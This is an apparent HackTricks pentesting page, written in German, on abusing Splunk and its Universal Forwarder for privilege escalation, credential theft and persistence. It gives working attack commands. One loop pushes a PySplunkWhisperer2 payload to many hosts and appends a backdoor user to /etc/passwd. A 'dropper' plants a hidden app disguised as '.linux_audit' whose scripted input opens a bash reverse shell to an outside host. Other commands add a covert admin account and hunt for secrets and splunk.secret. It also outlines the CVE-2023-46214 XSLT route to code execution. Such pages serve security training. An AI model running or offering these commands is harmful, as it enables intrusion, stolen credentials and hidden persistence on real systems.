# Splunk LPE und Persistence

{{#include ../../banners/hacktricks-training.md}}

Wenn du bei der **internen** oder **externen Enumeration** einer Maschine **Splunk running** findest (gewöhnlich **8000** für die Weboberfläche und **8089** für die Management API), können gültige Credentials häufig durch die Installation von Apps, scripted inputs oder Management-Aktionen in **code execution** umgewandelt werden. Wenn Splunk als **root** läuft, führt das häufig unmittelbar zu **privilege escalation**.

Wenn du nur die generische Remote-Angriffsfläche, Enumeration oder den App-Upload-RCE-Pfad benötigst, siehe:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Wenn du **bereits root** bist und der Splunk-Service nicht ausschließlich auf localhost lauscht, kannst du außerdem **Splunk password hashes** stehlen, **encrypted secrets** wiederherstellen oder eine **malicious app** pushen, um lokal oder über mehrere Forwarder hinweg Persistence aufrechtzuerhalten.

## Interessante lokale Dateien

Wenn du auf einem Host mit Splunk oder Splunk Universal Forwarder landest, sind dies normalerweise die interessantesten Pfade:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Wichtige Artefakte:

- **`$SPLUNK_HOME/etc/passwd`**: lokale Splunk-Benutzer und Passwort-Hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Schlüssel, den Splunk zur Verschlüsselung von Secrets verwendet, die in mehreren `.conf`-Dateien gespeichert sind.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: Bootstrap-Datei für den initialen Admin; nützlich bei Golden Images und Provisioning-Fehlern. Sie wird ignoriert, wenn `etc/passwd` bereits vorhanden ist.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: Hier werden scripted inputs häufig aktiviert.
- **`$SPLUNK_HOME/etc/deployment-apps/`** oder **`$SPLUNK_HOME/etc/apps/`**: Gute Orte, um eine persistente App zu verstecken oder zu überprüfen, was bereits verteilt wird.

## Splunk Universal Forwarder Agent Exploit Summary

Weitere Details findest du unter [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist nur eine Zusammenfassung:<sup>[[1]](#references)</sup>

**Exploit-Überblick:**
Ein Exploit gegen den Splunk Universal Forwarder (UF) ermöglicht es Angreifern mit dem **Agent-Passwort**, beliebigen Code auf Systemen auszuführen, auf denen der Agent läuft, und dadurch potenziell einen großen Teil der Umgebung zu kompromittieren.

**Warum es funktioniert:**

- Der Management-Service des UF ist häufig auf **TCP 8089** erreichbar.
- Angreifer können sich an der API authentifizieren und den Forwarder anweisen, ein **malicious app bundle** zu installieren.
- Dieselbe Primitive kann lokal für **LPE** oder remote für **RCE** verwendet werden.
- Public Tooling wie **SplunkWhisperer2** erstellt das App-Bundle automatisch und kann Payloads für Linux-Ziele anpassen.

**Häufige Möglichkeiten, das Passwort wiederherzustellen:**

- Klartext-Credentials in Dokumentationen, Scripts, Shares oder Deployment-Automatisierung.
- Passwort-Hashes in `$SPLUNK_HOME/etc/passwd`, gefolgt von Offline-Cracking.
- Golden Images oder Provisioning-Überreste wie `user-seed.conf`.

**Auswirkungen:**

- Code-Ausführung auf SYSTEM-/Root-Ebene auf jedem kompromittierten Host.
- Deployment persistenter Apps, Backdoors oder Ransomware.
- Deaktivierung oder Manipulation der Telemetrie, bevor die Daten weitergeleitet werden.

**Beispielbefehl für die Ausnutzung:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Nutzbare öffentliche Exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistenz über Scripted Inputs oder bösartige Apps

Wenn du **Dateisystem-Schreibzugriff** als `root`/`splunk` oder authentifizierten Zugriff zum Installieren von Apps hast, ist das Ablegen einer **benutzerdefinierten App** mit einem **scripted input** ein sehr zuverlässiger Persistenzmechanismus.<sup>[[2]](#references)</sup> Die eigene Dokumentation von Splunk erwartet, dass sich scripted inputs in einem App-Verzeichnis befinden und über `inputs.conf` aktiviert werden.

Typischer Aufbau:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimale `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Schneller Linux-Dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notizen:

- Derselbe Trick funktioniert auch mit **Universal Forwarder** unter `/opt/splunkforwarder/etc/apps/`.
- Angreifer tarnen sich häufig, indem sie ein legitimes Add-on ändern, anstatt eine offensichtlich bösartige App zu erstellen.
- Auf einem **deployment server** führt das Platzieren einer bösartigen App in `deployment-apps/` zu **flottenweiter Persistenz**, da Forwarder regelmäßig nachfragen, aktualisierte Apps herunterladen und häufig neu starten, um sie anzuwenden.

## Diebstahl von Zugangsdaten und Übernahme von Administratorkonten

Wenn du die lokalen Dateien von Splunk lesen kannst, gibt es normalerweise zwei gute Ziele: **Splunk-Administrat Zugriff** wiederherstellen und **verschlüsselte Dienstanmeldedaten** wiederherstellen.

### Passwort-Hashes und lokale Benutzer

Splunk speichert lokale Authentifizierungsdaten in `etc/passwd`. Je nach Deployment kann das Knacken dieser Datei gültige Zugangsdaten für die Weboberfläche und die Management-API liefern.

Wenn du bereits über gültige **admin**-Zugangsdaten verfügst und Splunk das **native** Authentifizierungs-Backend verwendet, kann die CLI selbst für Persistenz genutzt werden:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` und verschlüsselte Werte

Splunk verwendet `etc/auth/splunk.secret`, um vertrauliche Werte zu schützen, die in mehreren Konfigurationsdateien gespeichert sind. Wenn du sowohl das **Secret** als auch die relevanten **`.conf`-Dateien** stehlen kannst, kannst du häufig Folgendes wiederherstellen oder erneut verwenden:

- gemeinsame Secrets von Forwarder/Indexer wie `pass4SymmKey`
- Passwörter für TLS-Private-Keys wie `sslPassword`
- LDAP-Bind-Credentials wie `bindDNPassword`

Dies ist für **laterale Bewegungen** nützlich, selbst wenn das Splunk-Admin-Passwort selbst nicht crackbar ist.

### Missbrauch von `user-seed.conf`

`user-seed.conf` wird nur beim ersten Start oder wenn `etc/passwd` nicht existiert verarbeitet. Dadurch ist die Datei auf einem laufenden System weniger nützlich, aber besonders interessant bei:

- kompromittierten Installationsvorlagen
- Container-Images
- automatisierten Provisioning-Workflows
- Appliances, auf denen Splunk automatisch neu initialisiert wird

In diesen Fällen ermöglicht das Einfügen eines mit `splunk hash-passwd` erzeugten `HASHED_PASSWORD` einen unauffälligen Weg, nach einer erneuten Bereitstellung wieder Admin-Zugriff zu erhalten.

## Missbrauch von Splunk Queries

Weitere Informationen findest du unter [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Eine nützliche aktuelle Technik besteht darin, **vom Benutzer bereitgestelltes XSLT** in anfälligen Splunk-Enterprise-Versionen zu missbrauchen, um einen authentifizierten Account mit geringen Rechten in **OS command execution** als Benutzer `splunk` umzuwandeln.

Ablauf auf hoher Ebene:

1. Bei Splunk authentifizieren.
2. Eine schädliche **XSL**-Datei über die Preview-/Upload-Funktion hochladen.
3. Splunk dazu bringen, Suchergebnisse mit diesem hochgeladenen Stylesheet aus dem **dispatch**-Verzeichnis zu rendern.
4. Die XSLT-Payload verwenden, um eine Datei zu schreiben oder über Splunks Search-Pipeline eine Ausführung auszulösen, beispielsweise durch das Erreichen interner Funktionen wie `runshellscript`.

Die wichtige offensive Erkenntnis ist, dass dieser Weg **post-auth RCE ohne app upload** ermöglicht. Unter Linux landet man normalerweise im Account **`splunk`**, was dennoch wertvoll ist, da dieser Benutzer häufig Eigentümer des Application Trees ist, Secrets lesen kann und persistente Apps platzieren kann, die den Verlust der Shell überdauern.

Ein repräsentativer Pfad, der während der Exploitation verwendet wird, ist:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Wenn Splunk mit zu vielen Berechtigungen ausgeführt wird oder der `splunk`-Benutzer Zugriff auf gefährliche Skripte, beschreibbare Service-Units oder unsichere `sudo`-Regeln hat, entsteht daraus eine saubere **LPE**-Chain.

## Referenzen

- [1] [Splunk Forwarders für RCE und Persistence missbrauchen](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Vorsicht vor TraitorWare: Splunk für Persistence verwenden](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Analyse von CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
